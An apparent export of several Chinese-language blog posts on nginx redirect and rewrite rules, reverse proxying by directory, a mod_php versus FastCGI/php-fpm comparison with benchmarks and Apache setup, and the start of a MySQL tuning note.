    <content type="text"><![CDATA[nginx的301与302如何配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先看一个完整代码示例，关于nginx 301 302跳转的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;301跳转设置： 123456server &#123;listen 80;server_name 123.com;rewrite ^/(.*) http://456.com/$1 permanent;access_log off;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;302跳转设置： 123456server &#123;listen 80;server_name 123.com;rewrite ^/(.*) http://456.com/$1 redirect;access_log off;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在看下关于nginx 301 302跳转的详细说明文档 1234server &#123;server_name test.com;rewrite ^/(.*) http://www.test1.com/$1 permanent;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;last – 基本上都用这个Flag。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;break – 中止Rewirte，不在继续匹配 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;redirect – 返回临时重定向的HTTP状态302 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;permanent – 返回永久重定向的HTTP状态301 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx的重定向用到了Nginx的HttpRewriteModule，下面简单解释以下如何使用的方法： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rewrite命令 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx的rewrite相当于apache的rewriterule(大多数情况下可以把原有apache的rewrite规则加上引号就可以直接使用)，它可以用在server,location 和IF条件判断块中,命令格式如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rewrite 正则表达式 替换目标 flag标记 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;flag标记可以用以下几种格式： last – 基本上都用这个Flag。 break – 中止Rewirte，不在继续匹配 redirect – 返回临时重定向的HTTP状态302 permanent – 返回永久重定向的HTTP状态301 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;特别注意： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;last和break用来实现URL重写，浏览器地址栏的URL地址不变，但是在服务器端访问的路径发生了变化； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;redirect和permanent用来实现URL跳转，浏览器地址栏会显示跳转后的URL地址； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如下面这段设定nginx将某个目录下面的文件重定向到另一个目录,$2对应第二个括号(.*)中对应的字符串： 123location /download/ &#123; rewrite ^(/download/.*)/m/(.*)\..*$ $1/nginx-rewrite/$2.gz break;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx重定向的IF条件判断 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在server和location两种情况下可以使用nginx的IF条件判断，条件可以为以下几种： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如：匹配判断 ~ 为区分大小写匹配; !~为区分大小写不匹配 ~* 为不区分大小写匹配；!~为不区分大小写不匹配 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如下面设定nginx在用户使用ie的使用重定向到/nginx-ie目录下： 123if ($http_user_agent ~ MSIE) &#123; rewrite ^(.*)$ /nginx-ie/$1 break;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件和目录判断 -f和!-f判断是否存在文件 -d和!-d判断是否存在目录 -e和!-e判断是否存在文件或目录 -x和!-x判断文件是否可执行 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如下面设定nginx在文件和目录不存在的时候重定向： 1234if (!-e $request_filename) &#123; proxy_pass http://127.0.0.1;&#125;return &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回http代码，例如设置nginx防盗链： 123456location ~* \.(gif|jpg|png|swf|flv)$ &#123; valid_referers none blocked www.test.com www.test1.com; if ($invalid_referer) &#123; return 404; &#125;&#125;]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx域名跳转]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F15.%20nginx%E5%9F%9F%E5%90%8D%E8%B7%B3%E8%BD%AC%2F</url>
    <content type="text"><![CDATA[nginx域名跳转&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置 nginx 虚拟主机配置文件 1[root@lnmp ~]# vim /usr/local/nginx/conf/vhosts/123.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置如下： 1234if ($host != 'www.123.com')&#123; rewrite ^/(.*)$ http://www.123.com/$1 permanent;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测配置是否有错，并重新加载 nginx 服务 12[root@lnmp ~]# service nginx configtest[root@lnmp ~]# service nginx reload &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;curl 检测 1[root@lnmp ~]# curl -x127.0.0.1:80 www.234.com/123 -I]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mod_php和mod_fastcgi和php-fpm的介绍,对比,和性能数据]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F5.%20mod_php%E5%92%8Cmod_fastcgi%E5%92%8Cphp-fpm%E7%9A%84%E4%BB%8B%E7%BB%8D%2C%E5%AF%B9%E6%AF%94%2C%E5%92%8C%E6%80%A7%E8%83%BD%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[mod_php和mod_fastcgi和php-fpm的介绍,对比,和性能数据什么是mod_php和mod_fastcgi&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在lamp体系中，对于apache端php的配置，我们最常用的就是mod_php, 它把PHP做为APACHE一个内置模块。让apache http服务器本身能够支持PHP语言，不需要每一个请求就启动PHP解释器来解释PHP。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;和把webserver与php绑定起来的方式不同，fastcgi是HTTP服务器与你的或其它机器上的程序进行“交谈”的一种工具，相当于一个程序接口。它可以接受来自web服务器的请求，解释输入信息，将处理后的结果返回给服务器(apache,lighty等)。mod_fastcgi就是在apache下支持fastcgi协议的模块。 工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在介绍这两种模式的工作原理前，我们先了解一下php的架构 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面是php的架构图，从图上可以看到， SAPI提供了一个和外部通信的接口，使得PHP可以和其他应用进行交互数据。php默认提供了很多种SAPI，常见的给apache的mod_php5，CGI，给IIS的ISAPI，还有Shell的CLI。对于一个基于apache的php应用，其运行流程可以简单归结如下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apache -&gt; httpd -&gt; mod_phpfastcgi -&gt; sapi -&gt; php &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面提到的两种工作方式就分别用到了mod_php5和cgi的sapi。 mod_php&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; mod_php是在lamp体系中最常使用的工作方式，在这种模式下，php被编译为apache的一个内置模块，在启动时加载。当有一个php请求过来时，直接在httpd进程里完成php的解释运行，将结果返回。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在php的sapi中，有这样一个函数: sapi_cgibin_ub_write, 这个函数告诉了Zend，如何输出数据。查看mod_php的sapi源码，我们会发现，这个函数直接调用了apache的ap_rwrite函数。所以，用mod_php，我们可以把php和apache看做一个模块，两者绑定在一起。其工作原理如下图所示 mod_fastcgi&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在说明fastcgi之前，先了解一下普通cgi的工作流程： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;web server收到用户请求，并把请求提交给cgi程序，cgi程序根据请求提交的参数作应处理，然后输出标准的html语句返回给web server，web server再返回给客户端，这就是普通cgi的工作原理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;fastcgi是基于cgi架构的扩展，他的核心思想就是在web server和具体cgi程序之间建立一个智能的可持续的中间层，统管cgi程序的运行，这样web server只需要将请求提交给这个层，这个层再派生出几个可复用的cgi程序实例，然后再把请求分发给这些实例，这些实例是可控的，可持续，可复用的， 因此一方面避免了进程反复fork，另一方面又可以通过中间层的控制和探测机制来监视这些实例的运行情况，根据不同的状况fork或者回收实例，达到灵活 性和稳定性兼得的目的。modFastCGI的主要优点是把动态语言和web server分离开来。这种技术允许把web server和动态语言运行在不同的主机上，以大规模扩展和改进安全性而不损失生产效率。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基于mod_fastcgi方式的php应用，其典型工作流程如下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从图上可以看出， apache启动后，mod_fastcgi会在启动多个cgi程序，也就是php-cgi脚本。具体脚本的数目通过配置来指定。当有http请求到来后，httpd进程会选择一个当前空闲的一个php-cgi程序来执行，执行的方式和mod_php类似，也是通过php-cgi提供的sapi完成交互。查看源码，可以发现对于cgi的sapi，和mod_php不同，它是把结果输出到fastcgi提供的stdout上，fastcgi再将数据返回给httpd完成交互。 mod_factcgi的三种配置方式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基于mod_fastcgi的fastcgi应用一共有三种配置方式：静态、动态和远程。他们通过apache配置中的伪指令来代替，对应于三种方式的伪指令分别是FastCgiServer, FastCgiConfig, 以及FastCgiExternalServer。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于静态和动态这两种方式，apache将通过mod_fastcgi自带的进程管理工具(fcgi-pm)来管理fastcgi应用程序，也就是php-cgi。fcgi-pm在apache启动时就被自动激活了。相对于前两种，远程模式下，php-cgi不由fcgi-pm来管理，apache不会去关心php-cgi程序的状态。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面详细说一下三种配置方式 静态配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过FastCGIServer 伪指令将文件名定义为静态 FastCGI 应用程序。初始时需要指定启动的php-cgi进程数目，默认为1个。apache运行过程中，如果静态应用程序实例因为任何原因死了，那么fcgi-pm将衍生另一个实例来替换。 语法1FastCgiServer file name [options] 重要参数说明 idle-timeout n（30 秒）。在请求异常终止和事件记录在 error LogLevel 前，所允许的 FastCGI 应用程序不活动秒数。仅当存在与 FastCGI 应用程序的暂挂连接时，该不活动计时器才应用。如果应用程序在此期间不响应队列的请求，那么请求异常终止。如果与应用程序的通信完成，但是与客户机的通信未完成（缓存的响应），那么超时不应用。 processes n（1）。在服务器初始化时衍生的应用程序实例数。 port n 无。应用程序用于与 Web 服务器通信的 TCP 端口号（1-65535）。此选项使应用程序可以从网络中的其他机器访问。-socket 选项和 -port 选项是互斥的。 socket filename unix sock文件名 Restart-delay n（5 秒）。此应用程序的失败实例重新衍生之间的最小秒数。此延迟阻止中断的应用程序使用过多系统资源。 动态配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在静态配置中，我们初始就指定了要启动的php进程数。和静态的相反，动态应用程序根据需求启动。php应用实例的数目根据当前http请求数目动态变化，进程的管理也是通过fcgi-pm来完成。 语法1FastCgiConfig option [option ...] 重要参数说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;和静态方式相比，动态配置的参数主要增加了以下几个 maxProcesses n 在任何时候允许运行的最大动态 FastCGI 应用程序实例数。 minProcesses n 任何时候允许运行，且无须由fcgi-pm（因没有需求）杀死的最小动态 FastCGI 应用程序实例数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在dyn模式下，因为fastcgi实例数目是动态改变的。所以没有静态方式中process这个参数 远程方式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种模式下，fastcgi实例和apache分离开来，这两者可以分开来部署。他们之间的通信通过tcp或者unix sock来完成。使用ext方式，fastcgi实例将不会由fcgi-pm来管理，而是独立的运行。 语法12FastCgiExternalServer 文件名 -host 主机名端口 [-appConnTimeout n] FastCgiExternalServer 文件名 -socket 文件名 [-appConnTimeout n] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重要参数说明 idle-timeout n （30 秒） 在请求异常终止，并且事件记录之前，允许 FastCGI 应用程序保持不活动的秒数。只有当与 FastCGI 应用程序的连接暂挂时，此不活动定时器才适用。如果请求进入应用程序的请求队列，而此应用程序在此期间没有响应（通过写和刷新），则此请求将异常终止。如果与应用程序的通信已完成，而与客户机的通信尚未完成（响应被高速缓存），则此超时不适用。 host host:port 应用程序用于与 Web 服务器通信的主机名或 IP 地址和 TCP 端口号 (1-65535)。-socket 和 -host 选项是互斥的。 socket 文件名 无 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;应用程序用于与 Web 服务器通信的 UNIX 域套接字的文件名。此文件名相对于 FastCgiIpcDir。-socket 和 -port 选项是互斥的。 php-fpm&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用FastCGI，最主要优点是把应用和web server(apache)分离开来。这样允许把web server和动态语言(php)运行在不同的主机上，以大规模扩展和改进安全性而不损失效率。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样的情况下，对于php-cgi程序，由于从apache中分离出来，就需要一个单独的工具来对这些进程进行管理，在stc和dyn两种模式下，mod_fastcgi中自带的fcgi-pm会充当了这样的角色。可是，ext模式下却没有。我们只能通过一个脚本静态的启动n个实例，一旦进程死掉，还需要手工重启。当然，你可以使用supervise来管理这些进程，但是毕竟不那么灵活而且也仅仅一部份问题。甚至于fcgi-pm，因为实现的原因，其本身也有很多问题，例如不太稳定，压力下出core，无法平滑的完成切换等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基于上述的原因，我们需要一个稳定可靠的进程管理工具，就像lighty下的spwn-cgi。幸运的是，出现了php-fpm。它是一个类似于spwn-cgi的管理工具，可以和任何支持远端FastCGI的web server工作。在官方的手册上，列举了以下php-fpm所具有的特性： 特性 Php自带的 Spwn-cgi Php-fpm php守护程序： pid file, log file, setsid(), setuid(), setgid(), chroot() (-) (-) (+) 进程控制，可以平滑地重启、重新载入配置和二进制模块而不丢失请求 Php4 (-) Php5 只能平滑停止 (-) (+) 限制ip地址，可以满足web server的要求 php4 (-) php5.2.2 &gt; (+) (-) (+) 如果使用优化器，在遇到opcode缓存随机损坏的时候紧急重启所有进程 (-) (-) (+) 使用用不同的uid / gid / chroot / 环境变量，不同的 php.ini 选项，不需要safe mode (-) (-) (+) 记录work process的stdout和stderr (-) (-) (+) 如果set_time_limit没有起作用，强制结束过期进程 (-) (-) (+) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;特色功能 Error header、优化的上传支持、fastcgi_finish_request() 另外，php-fpm还可以兼容zend Optimize，各种缓存优化器。 Php-fpm的安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;php-fpm是以patch的方式安装的，如果要使用它，必须在安装php前打上这个补丁。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;eg: 1gzip -cd php-5.2.6-fpm-0.5.9.diff.gz | patch -d php-5.2.6 -p1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在configure时加上–enable-fpm选项。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装完php后，会有以下几个文件 123$prefix/ext/php-fpm.conf $prefix/log/php-fpm.log $prefix/log/php-fpm.pid &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中php-fpm.conf是配置文件，具体如何配置文件里有非常详尽的注释。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后，执行./bin/php-cgi –fpm &amp;就可以了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，你也可以使用$prexif/sbin/php-fpm脚本来方便的维护。 性能测试名称解释 ab apache自测的性能测试工具，主要用于测试极限压力：对于同一url每秒所能执行的次数及响应时间。 myab baidu开发的压力测试工具，区别于ab，其更主要的功能是测试指定压力条件下机器的负载情况。 eacc 一种php加速器，主要是将php程序编译后的结果缓存起来。加速php的执行，对性能有很大幅度的提升 ，更详细的情况可以参见另一篇关于php缓存优化的文档 《缓存优化工具-php加速的利器》 etc、stc、dyn mod_fastcgi运行的模式，分别指远程、静态和动态模式 测试内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试中我们将针对不同的运行模式和页面类型进行极限压力测试及机器负载测试。同时，我们还将测试使用缓存优化和不使用缓存优化下机器的表现情况。另外，由于我们的测试主要是对比两种模式的性能差别，因此对于机器的硬件配置不是特别敏感，测试的时候只需要保证机器负载为0即可。 测试结果 最简单的php页面压力工具：mysql压力情况：每秒1000次请求，并发数70。性能指标：cpu idle &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不同模式下机器idle情况如下图 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从图上我们可以看出，测试最简单的php页面时，各种模式下性能几乎没有差别，且由于页面非常简单，eacc的效果也基本没有。 复杂的php程序（2000行代码+）压力工具：mysql压力情况：每秒400次请求,并发数70性能指标：cpu idle &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试结果如下图 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从图上可以看出，在php代码复杂的情况下，前面4中模式性能差别不大，mod_php略优，然后fastcgi动态配置的方式在此情况下性能差距非常之大，idle直接降为0，同时虽然每秒是400次的压力，其只能处理200次左右的请求。 由于php代码很复杂，eacc的作用明显体现出来，使用缓存优化后性能提升一倍以上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，还可以看出，eacc这样的缓存优化工具对于mod_php和fastcgi方式起到的作用基本相同，他们之间的性能差异和使用前维持相同。 在上述情况下，如果不适应fpm，fastcgi模式会出core，主要原因还在在于进程管理的问题。 实际项目中的php程序这里我们采用群组项目中的pb页面，涉及到和数据库交互，db交互2次。db部署在其他机器，每次请求耗时50ms左右。压力工具：mysql压力情况：每秒400次请求,并发数70性能指标：cpu idle &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试结果如下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从图上可以看出，性能的情况和图2类似，各种模式的差距仍然不大。 极限压力测试压力工具：ab测试参数：并发请求数100，总次数10000次。测试页面：pb页面性能指标：每秒请求数 rps &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上图我们可以看到，极限压力下，使用eacc后，mod_php和ext(fpm)基本差不多，保持在860/s左右的水平，而使用fpm方式进行管理的模式略优于其他两种fastcgi模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试中发现，fastcgi模式下，不使用php-fpm管理的话，仍然会有core出现。 fastcgi配置项对性能的影响。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在mod_fastcgi下，不管是ext还是stc方式，有一个配置项是非常关键的：默认启动的php-cgi进程实例数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从fastcgi原理可以看出，当有一个httpd进程到来时，它需要调用fastcgi server来执行，如果此时所有server都出于服务状态，则这个httpd进程将出于等待状态得不到服务，导致请求无法响应。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对pb页面进行测试，配置不同的实例数目进行极限压力测试，得到结果如下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;分析一下这个原因： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们的pb页面执行时间是50ms，也就是说一个php-cgi程序在1s内可以处理的请求数目是1000/50 = 20。假设启动的实例数目是n，则1s内最多能完成的请求数为n20，从图上可以看出，实际结果符合我们的计算。另外，这个数值也不是无限增大了，当n20大于server本身所能承受的极限时，rps也不会继续往上增长了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，使用fastcgi，对于n的选择，要综合页面平均处理时间，最大压力等多种因素结合来配置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同时，在ext方式下，webserver和fastcgi server交互的方式有两种：通过tcp或者unix sock。测试一下这两种方式的情况 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用myab每秒400次请求pb页面，机器idle &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从图上可以看出，不管是否使用eacc，tcp方式的idle都有一个百分点的下降，这个差异主要是因为多了tcp连接过程造成的。 分析&amp;结论&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据各种测试结果，可以看出和fastcgi方式相比，mod_php的性能在各种情况下都稍优，这种差异主要是在于后一种方式增加了一次数据交互过程php-&gt;fascgi-&gt;apache。但是这个差距并不大，在使用了eacc等缓存优化工具后，性能有了很大提升。他们之间的差距完全不是瓶颈。从使用的角度来说，fastcgi具有以下优点：1． webserver和php程序分离，两者可以部署在不同的地方，通过socket方式通信带来一定安全性2． 使用fastcgi，在出现问题时可以更好的定位是webserver还是php的原因3． fastcgi方式不依赖于webserver，更加灵活，扩展性也更好4． fastcgi本身会有一些进程监控和日志记录，更便于分析问题，跟踪状态。5． 灵活多样的配置，可以根据实际的应用进行合理配置达到最佳效果。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然fastcgi也有一些缺点1． mod_fastcgi在进程管理上有一些问题，容易出core。这个问题通过使用php-fpm可以解决2． 由于fastcgi应用单独分离出来，因此需要单独监控进程的状态。防止进程挂掉后导致服务出现问题，这个可以通过使用用supervise管理一定程度上避免这个问题。3． 文档相对缺乏，mod_fastcgi对apache的支持也不是特别好，且基本没有升级。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于fastcgi运行方式的选择，从效率、稳定性等各方面来说，ext方式是最佳选择了。而且考虑到我们可能会将webserver和php分开到不同机器，选择远程方式也是必须的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进程管理工具，从各方面来说，php-fpm是最优选择了，即时使用lighty作用web server，也完全可以用它代替spwn-cgi。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;综合测试结果和上述分析，我们完全可以采用fastcgi代替传统的mod_php。推荐使用下面的组合方式 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apache + ext + php-fpm(with superwise) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果webserver和fastcgi部署在同一机器上，使用unix sock方式通信，否则使用tcp方式。 附录apache+mod_fastcgi+php搭建 phpmod_fastcgi的搭建主要有三种方式stc、ext和dyn，不管是哪种方式，首先在安装php的时候需要加上如下选项–enable-fastcgi，并且不能使用—with-apxs。以下是一个配置php例子 12345678910111213141516171819202122./configure \--prefix=/home/club/hongdk/env/php5.26-fcgi/ \--enable-trace-vars \ --with-zlib-dir=/home/club/hongdk/tool/zlib/ \--with-mysql=/home/club/hongdk/env/mysql5/ \ --with-mysqli=/home/club/hongdk/env/mysql5/bin/mysql_config \--with-gettext \--with-iconv \ --enable-mbstring=gbk \--with-xmlrpc \ --enable-safe-mode \--enable-sockets \--enable-url-fopen-wrapper \--enable-ftp \--enable-shmop \--with-config-file-path=/home/club/hongdk/env/php5.26-fcgi/ \--enable-xml \--with-dom=/home/club/hongdk/tool/libxml/ \--with-libxml-dir=/home/club/hongdk/tool/libxml/ \ --with-curl=/home/club/hongdk/tool/curl \--with-curlwrappers \--enable-fastcgi \ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在安装完后，会在php的bin目录下找到如下文件php-cgi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行 ./php-cgi –v，如果看到 123PHP 5.2.5 (cgi-fcgi) (built: Nov 12 2008 20:44:08)Copyright (c) 1997-2007 The PHP Group Zend Engine v2.2.0, Copyright (c) 1998-2007 Zend Technologies &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就表明安装成功了 mod_fastcgi 123cd mod_fastcgi-2.4.6 cp Makefile.AP2 Makefile vi Makefile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改top_dir为apache安装目录 12makemake install apache配置修改httpd.conf首先增加 1LoadModule fastcgi_module modules/mod_fastcgi.so &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后根据不同的运行模式进行配置 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;eg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ext模式 1234567&lt;IfModule mod_fastcgi.c&gt; FastCgiExternalServer $php-server -socket /home/club/fastcgi.sock ScriptAlias /cgi-bin/ "/home/club/hongdk/env/apache-fcgi/cgi-bin/" AddHandler php-fastcgi .php Action php-fastcgi /cgi-bin/php-cgi AddType application/x-httpd-php .php&lt;/IfModule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中 $php-sever 为php-cgi程序,例如/home/club/hongdk/env/apache-fcgi/cgi-bin/php-cgi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;stc模式 12345678&lt;IfModule mod_fastcgi.c&gt; FastCgiServer $php-server -processes 10 ScriptAlias /cgi-bin/ "/home/club/hongdk/env/apache-fcgi/cgi-bin/" AddHandler php-fastcgi .php Action php-fastcgi /cgi-bin/php-cgi AddType application/x-httpd-php .php&lt;/IfModule&gt; ` &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;dyn模式 1234567&lt;IfModule mod_fastcgi.c&gt; FastcgiConfig –idle-timeout 120 ScriptAlias /cgi-bin/ "/home/club/hongdk/env/apache-fcgi/cgi-bin/" AddHandler php-fastcgi .php Action php-fastcgi /cgi-bin/php-cgi AddType application/x-httpd-php .php&lt;/IfModule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后，定义fastcgi server也就是我们的php-cgi程序所在文件夹的权限 12345&lt;Directory $php-server&gt; Options ExecCGI Order allow,deny Allow from all&lt;/Directory&gt; fastcgi应用在我们的应用中就是php-cgi如果是stc和dyn方式，不需要单独再启动php-cgi，他们的管理有mod_fastcgi自带的fcgi-pm来完成在etc模式下，我们需要单独启动php-cgi程序可以用php-fpm来完成。也可以独立的使用一个脚本来启动，例如 123456#!/bin/shexec &amp;&gt; /dev/nullexec &lt; /dev/nullPHP_FCGI_CHILDREN=32export PHP_FCGI_CHILDRENexec /home/club/hongdk/env/apache-fcgi/cgi-bin/php-cgi -b ./xl.sock -c /home/club/hongdk/env/php5-fcgi/php.ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;推荐使用php-fpm来完成]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx代理--根据访问的目录来区分后端的web]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F32.%20nginx%E4%BB%A3%E7%90%86--%E6%A0%B9%E6%8D%AE%E8%AE%BF%E9%97%AE%E7%9A%84%E7%9B%AE%E5%BD%95%E6%9D%A5%E5%8C%BA%E5%88%86%E5%90%8E%E7%AB%AF%E7%9A%84web%2F</url>
    <content type="text"><![CDATA[nginx代理–根据访问的目录来区分后端的web&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需求： 当请求的目录是 /aaa/ 则把请求发送到机器a，当请求的目录为/bbb/则把请求发送到机器b，除了目录/aaa/与目录/bbb/外，其他的请求发送到机器b &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置文件内容为： 123456789101112131415161718192021222324252627282930313233upstream aaa.com&#123; server 192.168.111.6;&#125; upstream bbb.com&#123; server 192.168.111.20;&#125;server &#123; listen 80; server_name li.com; location /aaa/ &#123; proxy_pass http://aaa.com/aaa/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;location /bbb/ &#123; proxy_pass http://bbb.com/bbb/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;location / &#123; proxy_pass http://bbb.com/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： 以上配置文件中的 aaa.com 以及 bbb.com 都是自定义的，随便写。 upstream 中的server 可以写多个，例如 123456upstream aaa.com &#123; server 192.168.111.6; server 192.168.111.4; server 192.168.111.5;&#125; proxy_pass http://aaa.com/aaa/ 这里必须要加这个目录，不然就访问到根目录了。 实际上，上述配置文件中， localtion /bbb/ 部分是可以省略掉的，因为后边的 location / 已经包含了/bbb/，所以即使我们不去定义 localtion /bbb/ 也是会访问到 bbb.com 的。]]></content>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于mysql一些优化心得]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F8.%20%E5%85%B3%E4%BA%8Emysql%E4%B8%80%E4%BA%9B%E4%BC%98%E5%8C%96%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[关于mysql一些优化心得&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先介绍下服务器架构及配置8核8G，10M带宽Centos6.5 64 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1.8.1PHP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;5.3.29Mysql&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;5.5.42 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一电商网站后台查询订单时 经常php超时，导致php报错以下是排查过程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一、php执行超时，首先我们想到的就是php.ini文件中max_execution_time = #把默认的值调整了下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;二、然后在后台执行订单查询php不报错了，但是查询耗时较长，用时65s. 而且一些表成锁死状态碎片比较多，本人对mysql数据库优化不是很了解，于是百度了一下：一般mysql调优主要是根据慢查询日志去优化sql语句，my.cnf里面没啥可调的。 